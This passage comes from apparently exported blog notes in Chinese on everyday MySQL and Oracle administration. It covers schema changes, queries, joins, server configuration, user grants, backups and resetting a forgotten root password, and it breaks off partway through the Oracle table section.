<h5 id="新增表字段"><a href="#新增表字段" class="headerlink" title="新增表字段"></a>新增表字段</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="keyword">user</span> <span class="keyword">add</span> <span class="keyword">COLUMN</span> age <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;年龄&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="修改表字段"><a href="#修改表字段" class="headerlink" title="修改表字段"></a>修改表字段</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="keyword">user</span> MODIFY <span class="keyword">COLUMN</span> age <span class="type">varchar</span>(<span class="number">64</span>) COMMENT <span class="string">&#x27;年龄&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="删除表字段"><a href="#删除表字段" class="headerlink" title="删除表字段"></a>删除表字段</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="keyword">user</span> <span class="keyword">DROP</span> age;</span><br></pre></td></tr></table></figure>
<h4 id="MySQL管理语句"><a href="#MySQL管理语句" class="headerlink" title="MySQL管理语句"></a>MySQL管理语句</h4><h5 id="连接本机数据库"><a href="#连接本机数据库" class="headerlink" title="连接本机数据库"></a>连接本机数据库</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>uroot <span class="operator">-</span>p密码</span><br></pre></td></tr></table></figure>
<h5 id="连接到远程主机上的MYSQL"><a href="#连接到远程主机上的MYSQL" class="headerlink" title="连接到远程主机上的MYSQL"></a>连接到远程主机上的MYSQL</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>uroot <span class="operator">-</span>p <span class="number">123456</span></span><br></pre></td></tr></table></figure>
<h5 id="修改mysql中root的密码"><a href="#修改mysql中root的密码" class="headerlink" title="修改mysql中root的密码"></a>修改mysql中root的密码</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqladmin <span class="operator">-</span>u root password &quot;newpwd&quot;;</span><br></pre></td></tr></table></figure>
<h5 id="添加创建用户"><a href="#添加创建用户" class="headerlink" title="添加创建用户"></a>添加创建用户</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> mikechen;   添加用户</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;mikechen&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;password&#x27;</span> ;  给用户权限</span><br><span class="line">这里是把操作数据库的所有权限给了mikechen，并且设置密码是password。</span><br></pre></td></tr></table></figure>
<h4 id="MySQL增删改查语句"><a href="#MySQL增删改查语句" class="headerlink" title="MySQL增删改查语句"></a>MySQL增删改查语句</h4><h5 id="MySQL插入数据"><a href="#MySQL插入数据" class="headerlink" title="MySQL插入数据"></a>MySQL插入数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> ( <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>, ...) <span class="keyword">values</span> ( 值<span class="number">1</span>, ...)</span><br></pre></td></tr></table></figure>
<h5 id="MySQL删除数据"><a href="#MySQL删除数据" class="headerlink" title="MySQL删除数据"></a>MySQL删除数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 [<span class="keyword">where</span>  条件]</span><br></pre></td></tr></table></figure>
<h5 id="MySQL修改数据"><a href="#MySQL修改数据" class="headerlink" title="MySQL修改数据"></a>MySQL修改数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>，字段名<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span>，....[<span class="keyword">where</span>条件]</span><br></pre></td></tr></table></figure>
<h5 id="MySQL查询数据"><a href="#MySQL查询数据" class="headerlink" title="MySQL查询数据"></a>MySQL查询数据</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">&lt;</span>字段<span class="number">1</span>，字段<span class="number">2</span>，...<span class="operator">&gt;</span> <span class="keyword">from</span> <span class="operator">&lt;</span> 表名 <span class="operator">&gt;</span> <span class="keyword">where</span> <span class="operator">&lt;</span> 表达式 <span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="MySQL索引语句"><a href="#MySQL索引语句" class="headerlink" title="MySQL索引语句"></a>MySQL索引语句</h4><h5 id="使用CREATE-INDEX"><a href="#使用CREATE-INDEX" class="headerlink" title="使用CREATE INDEX"></a>使用CREATE INDEX</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">能够增加普通索引和<span class="keyword">UNIQUE</span>索引两种，其格式如下：</span><br><span class="line"><span class="keyword">create</span> index index_name <span class="keyword">on</span> table_name (column_list) ;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index index_name <span class="keyword">on</span> table_name (column_list) ;</span><br></pre></td></tr></table></figure>
<h5 id="使用ALTER-TABLE"><a href="#使用ALTER-TABLE" class="headerlink" title="使用ALTER TABLE"></a>使用ALTER TABLE</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">PRIMARY KEY</span>（主键索引）</span><br><span class="line">        mysql<span class="operator">&gt;</span><span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">PRIMARY KEY</span> index_name(`column1`, `column2`) </span><br><span class="line"><span class="number">2.</span><span class="keyword">UNIQUE</span>(唯一索引)</span><br><span class="line">        mysql<span class="operator">&gt;</span><span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> index_name(`column1`, `column2`) </span><br><span class="line"><span class="number">3.</span>INDEX(普通索引)</span><br><span class="line">        mysql<span class="operator">&gt;</span><span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> INDEX index_name (`column1`, `column2`)</span><br><span class="line"><span class="number">4.</span>FULLTEXT(全文索引)</span><br><span class="line">        mysql<span class="operator">&gt;</span><span class="keyword">ALTER TABLE</span> `table_name` <span class="keyword">ADD</span> FULLTEXT (`column1`, `column2`)</span><br></pre></td></tr></table></figure>
<h5 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span>如果查看索引前，没有使用<span class="keyword">user</span> db_name等命令指定具体的数据库，则必须加上<span class="keyword">FROM</span> db_name</span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> table_name [<span class="keyword">FROM</span> db_name]</span><br><span class="line"><span class="comment">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上db_name.前缀</span></span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> [db_name.]table_name</span><br></pre></td></tr></table></figure>
<h5 id="修改索引"><a href="#修改索引" class="headerlink" title="修改索引"></a>修改索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span>先删除</span><br><span class="line"><span class="keyword">ALTER TABLE</span> <span class="keyword">user</span></span><br><span class="line"><span class="keyword">DROP</span> INDEX idx_user_username;</span><br><span class="line"><span class="comment">--再以修改后的内容创建同名索引</span></span><br><span class="line"><span class="keyword">CREATE</span> INDEX idx_cust_name <span class="keyword">ON</span> customers (cust_name(<span class="number">8</span>));</span><br></pre></td></tr></table></figure>
<h5 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> customers</span><br><span class="line"><span class="keyword">DROP</span> INDEX idx_cust_name;</span><br></pre></td></tr></table></figure>
<h4 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h4><h5 id="直接查询"><a href="#直接查询" class="headerlink" title="直接查询"></a>直接查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名</span><br></pre></td></tr></table></figure>
<h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure>
<h5 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段 <span class="keyword">from</span> 表名 <span class="keyword">order</span> <span class="keyword">by</span> 字段 排序方式(<span class="keyword">desc</span>:<span class="keyword">asc</span>)</span><br></pre></td></tr></table></figure>
<h5 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> userwhere age <span class="operator">&gt;=</span><span class="number">21</span> <span class="keyword">and</span> age<span class="operator">&lt;=</span><span class="number">23</span>;</span><br></pre></td></tr></table></figure>
<h5 id="SQL查询五子句"><a href="#SQL查询五子句" class="headerlink" title="SQL查询五子句"></a>SQL查询五子句</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span><span class="operator">/</span>字段列表 <span class="keyword">from</span> 数据表名称 <span class="keyword">where</span> 子句 <span class="keyword">group</span> <span class="keyword">by</span> 子句 <span class="keyword">having</span> 子句 <span class="keyword">order</span> <span class="keyword">by</span> 子句 limit 子句;</span><br><span class="line"></span><br><span class="line">①.<span class="keyword">where</span> 子句</span><br><span class="line">②.<span class="keyword">group</span> <span class="keyword">by</span> 子句</span><br><span class="line">③.<span class="keyword">having</span> 子句</span><br><span class="line">④.<span class="keyword">order</span> <span class="keyword">by</span> 子句</span><br><span class="line">⑤.limit子句</span><br></pre></td></tr></table></figure>
<h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> uid, name <span class="keyword">FROM</span> staffs <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;a%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h5 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> uid, name <span class="keyword">FROM</span> staffs <span class="keyword">WHERE</span> uid <span class="keyword">IN</span>(<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<h5 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> staffs LIMIT <span class="number">5</span>, <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
<h5 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h5><p><img src="https://s2.loli.net/2025/01/18/Gm3nWlJZ7H5RNt6.gif"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_list</span><br><span class="line"><span class="keyword">FROM</span> t1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> t2 <span class="keyword">ON</span> join_condition;</span><br></pre></td></tr></table></figure>
<p>也叫内连接或等值连接，用于获取两个表中字段匹配关系的记录。</p>
<p><img src="https://s2.loli.net/2025/01/18/9sA2NhSRmMzJiwU.gif"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    t1.c1, t1.c2, t2.c1, t2.c2</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">    t1</span><br><span class="line">        <span class="keyword">LEFT</span> <span class="keyword">JOIN</span></span><br><span class="line">    t2 <span class="keyword">ON</span> t1.c1 <span class="operator">=</span> t2.c1;</span><br></pre></td></tr></table></figure>
<p>左连接：获取左表所有记录，即使右表没有对应匹配的记录。</p>
<p><img src="https://s2.loli.net/2025/01/18/MtLPk146X3l5CHq.gif"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">from</span> students <span class="keyword">as</span> s</span><br><span class="line"><span class="keyword">right</span> <span class="keyword">join</span> teacher <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">on</span> s.class_id <span class="operator">=</span> t.class_id</span><br></pre></td></tr></table></figure>
<p>与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。</p>
<h3 id="MySQL配置详解"><a href="#MySQL配置详解" class="headerlink" title="MySQL配置详解"></a>MySQL配置详解</h3><h4 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"># 基础设置</span><br><span class="line">datadir=/var/lib/mysql           # 数据文件存储路径</span><br><span class="line">socket=/var/lib/mysql/mysql.sock  # Unix套接字路径</span><br><span class="line">pid-file=/var/run/mysqld/mysqld.pid  # 进程ID文件</span><br><span class="line">port=3306                        # 服务端口</span><br><span class="line">user=mysql                       # 运行用户</span><br><span class="line"></span><br><span class="line"># 字符集设置（重要！避免乱码）</span><br><span class="line">character-set-server=utf8mb4     # 服务器默认字符集</span><br><span class="line">collation-server=utf8mb4_unicode_ci  # 默认排序规则</span><br><span class="line">init_connect=&#x27;SET NAMES utf8mb4&#x27;  # 客户端连接时自动设置</span><br><span class="line"></span><br><span class="line"># 网络与安全</span><br><span class="line">bind-address=0.0.0.0             # 监听所有IP（生产环境建议指定具体IP）</span><br><span class="line">skip-name-resolve                # 禁用DNS解析，提高性能</span><br></pre></td></tr></table></figure>
<h4 id="内存和性能优化"><a href="#内存和性能优化" class="headerlink" title="内存和性能优化"></a>内存和性能优化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 内存分配（根据服务器总内存调整）</span><br><span class="line">innodb_buffer_pool_size=1G       # InnoDB缓存池大小（通常占总内存50-75%）</span><br><span class="line">key_buffer_size=128M             # MyISAM索引缓存</span><br><span class="line">query_cache_size=64M             # 查询缓存大小（5.7后逐渐弃用，8.0移除）</span><br><span class="line"></span><br><span class="line"># 日志配置</span><br><span class="line">log-bin=mysql-bin                # 启用二进制日志（主从复制必须）</span><br><span class="line">expire-logs-days=7               # 二进制日志保留天数</span><br><span class="line">slow-query-log=1                 # 开启慢查询日志</span><br><span class="line">slow-query-log-file=/var/log/mysql/slow.log  # 慢查询日志路径</span><br><span class="line">long_query_time=2                # 超过2秒的查询记录到慢日志</span><br></pre></td></tr></table></figure>
<h4 id="连接与线程"><a href="#连接与线程" class="headerlink" title="连接与线程"></a>连接与线程</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">max_connections=200              # 最大连接数</span><br><span class="line">back_log=100                     # 连接队列长度</span><br><span class="line">wait_timeout=28800               # 空闲连接超时时间（秒）</span><br></pre></td></tr></table></figure>
<h4 id="服务控制"><a href="#服务控制" class="headerlink" title="服务控制"></a>服务控制</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动/停止/重启服务（systemd方式）</span></span><br><span class="line">systemctl start mysql</span><br><span class="line">systemctl stop mysql</span><br><span class="line">systemctl restart mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看服务状态</span></span><br><span class="line">systemctl status mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口监听</span></span><br><span class="line">netstat -tlnp | grep 3306</span><br></pre></td></tr></table></figure>
<h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接本地MySQL</span></span><br><span class="line">mysql -u root -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接远程MySQL</span></span><br><span class="line">mysql -h 192.168.1.100 -P 3306 -u user -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行SQL脚本</span></span><br><span class="line">mysql -u root -p &lt; script.sql</span><br></pre></td></tr></table></figure>
<h4 id="用户与权限管理"><a href="#用户与权限管理" class="headerlink" title="用户与权限管理"></a>用户与权限管理</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建用户并授权（允许从任意主机连接）</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看用户权限</span></span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 撤销权限</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> mydb.<span class="operator">*</span> <span class="keyword">FROM</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除用户</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="查看状态与变量"><a href="#查看状态与变量" class="headerlink" title="查看状态与变量"></a>查看状态与变量</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看服务器状态</span></span><br><span class="line"><span class="keyword">SHOW</span> STATUS;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看配置变量</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看InnoDB缓冲池状态</span></span><br><span class="line"><span class="keyword">SHOW</span> ENGINE INNODB STATUS;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看当前连接</span></span><br><span class="line"><span class="keyword">SHOW</span> PROCESSLIST;</span><br></pre></td></tr></table></figure>
<h4 id="逻辑备份"><a href="#逻辑备份" class="headerlink" title="逻辑备份"></a>逻辑备份</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份单个数据库</span></span><br><span class="line">mysqldump -u root -p mydb &gt; mydb_backup.sql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">备份所有数据库</span></span><br><span class="line">mysqldump -u root -p --all-databases &gt; all_databases_backup.sql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">恢复数据库</span></span><br><span class="line">mysql -u root -p mydb &lt; mydb_backup.sql</span><br></pre></td></tr></table></figure>
<h4 id="定期备份脚本"><a href="#定期备份脚本" class="headerlink" title="定期备份脚本"></a>定期备份脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">BACKUP_DIR=&quot;/backup/mysql&quot;</span><br><span class="line">DATE=$(date +%Y%m%d)</span><br><span class="line">USER=&quot;root&quot;</span><br><span class="line">PASSWORD=&quot;password&quot;</span><br><span class="line"></span><br><span class="line">mkdir -p $BACKUP_DIR/$DATE</span><br><span class="line">mysqldump -u$USER -p$PASSWORD --all-databases &gt; $BACKUP_DIR/$DATE/all_databases.sql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除7天前的备份</span></span><br><span class="line">find $BACKUP_DIR -type d -mtime +7 -exec rm -rf &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<h3 id="MySQL疑难杂症"><a href="#MySQL疑难杂症" class="headerlink" title="MySQL疑难杂症"></a>MySQL疑难杂症</h3><h4 id="重置root密码-忘记原密码"><a href="#重置root密码-忘记原密码" class="headerlink" title="重置root密码(忘记原密码)"></a>重置root密码(忘记原密码)</h4><p>重置MySQL root密码的通用步骤（适用于MySQL 5.7及8.0版本）：<br><strong>方法一：通过跳过权限验证重置密码36</strong><br>停止MySQL服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">net stop MySQL80</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux（systemd系统）</span></span><br><span class="line">sudo systemctl stop mysqld</span><br></pre></td></tr></table></figure>
<p>以无权限模式启动MySQL,保持当前终端窗口运行（不要关闭）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需指定my.ini/my.cnf路径（Windows参考路径示例）</span></span><br><span class="line">mysqld --defaults-file=&quot;C:\ProgramData\MySQL\MySQL Server 8.0\my.ini&quot; --skip-grant-tables --shared-memory</span><br></pre></td></tr></table></figure>
<p>重置密码,新开一个终端窗口执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root</span><br></pre></td></tr></table></figure>
<p>在MySQL交互界面输入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">FLUSH PRIVILEGES;  <span class="comment">-- 刷新权限（必须执行）</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;YourNewPass&#x27;</span>;  <span class="comment">-- MySQL 5.7+</span></span><br><span class="line"><span class="comment">-- 或（MySQL 8.0可能需要指定插件）</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;YourNewPass&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;  <span class="comment">-- 再次刷新</span></span><br><span class="line">EXIT;</span><br></pre></td></tr></table></figure>
<p>重启MySQL服务,回到第2步的窗口按Ctrl+C终止无权限模式，然后重启服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Windows</span></span><br><span class="line">net start MySQL80</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Linux</span></span><br><span class="line">sudo systemctl start mysqld</span><br></pre></td></tr></table></figure>
<p><strong>方法二：通过初始化文件重置密码4</strong><br>创建初始化文件,新建文本文件mysql-init.txt，写入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;NewPassword&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>启动MySQL时加载文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqld --init-file=/path/to/mysql-init.txt --console</span><br></pre></td></tr></table></figure>
<p>启动后密码即被修改，完成后删除初始化文件。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle笔记</title>
    <url>/cnblogs.github.io/2025/05/31/database/oracle/Oracle%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="Oracle数据库连接"><a href="#Oracle数据库连接" class="headerlink" title="Oracle数据库连接"></a>Oracle数据库连接</h3><p>三种以系统管理员身份连接数据库的方式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">conn / as sysdba  -- 无需监听进程</span><br><span class="line">conn system/admin  -- 本地连接</span><br><span class="line">conn system/admin@oracle  -- 需要监听进程</span><br></pre></td></tr></table></figure>
<p>查看当前数据库有多少用户连接</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username, sid, serial# <span class="keyword">from</span> v$session;</span><br></pre></td></tr></table></figure>
<p>监听服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsnrctl start  -- 启动监听  </span><br><span class="line">lsnrctl stop   -- 关闭监听  </span><br><span class="line">lsnrctl status -- 查看监听状态</span><br></pre></td></tr></table></figure>
<p>Oracle实例服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">startup;  -- 启动实例</span><br><span class="line">shutdown immediate;  -- 关闭实例</span><br><span class="line">select * from v$instance;  -- 查看实例状态</span><br></pre></td></tr></table></figure>

<h3 id="Oracle用户管理"><a href="#Oracle用户管理" class="headerlink" title="Oracle用户管理"></a>Oracle用户管理</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看系统已有用户</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> all_users;</span><br><span class="line"></span><br><span class="line"># 显示当前连接用户</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">user</span>;</span><br><span class="line"></span><br><span class="line"># 创建新用户并授权</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> a identified <span class="keyword">by</span> a;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>, resource <span class="keyword">to</span> a;</span><br><span class="line"></span><br><span class="line"># 修改用户密码</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> a identified <span class="keyword">by</span> <span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line"># 授权用户可以访问数据库所有表</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span> <span class="keyword">any</span> <span class="keyword">table</span> <span class="keyword">to</span> a;</span><br><span class="line"></span><br><span class="line"># 授权用户操作其他用户的表</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>, <span class="keyword">insert</span>, <span class="keyword">update</span>, <span class="keyword">delete</span> <span class="keyword">on</span> student.emp <span class="keyword">to</span> a;</span><br><span class="line"></span><br><span class="line"># 查找用户下的所有表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tab;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的默认表空间</span><br><span class="line"><span class="keyword">select</span> username, default_tablespace <span class="keyword">from</span> user_users;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的角色</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_role_privs;</span><br><span class="line"></span><br><span class="line"># 查看当前用户的权限</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_sys_privs;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_tab_privs;</span><br></pre></td></tr></table></figure>

<h3 id="Oracle表操作"><a href="#Oracle表操作" class="headerlink" title="Oracle表操作"></a>Oracle表操作</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看用户下所有的表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_tables;</span><br><span class="line"></span><br><span class="line"># 查找表名包含&quot;LOG&quot;的表</span><br><span class="line"><span class="keyword">select</span> object_name, object_id <span class="keyword">from</span> user_objects <span class="keyword">where</span> instr(object_name, <span class="string">&#x27;LOG&#x27;</span>) <span class="operator">&gt;</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"># 查看表的创建时间</span><br><span class="line"><span class="keyword">select</span> object_name, created <span class="keyword">from</span> user_objects <span class="keyword">where</span> object_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;table_name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 查看表的大小</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(bytes) <span class="operator">/</span> (<span class="number">1024</span><span class="operator">*</span><span class="number">1024</span>) <span class="keyword">as</span> &quot;size(M)&quot; <span class="keyword">from</span> user_segments <span class="keyword">where</span> segment_name <span class="operator">=</span> <span class="built_in">upper</span>(<span class="string">&#x27;&amp;table_name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># 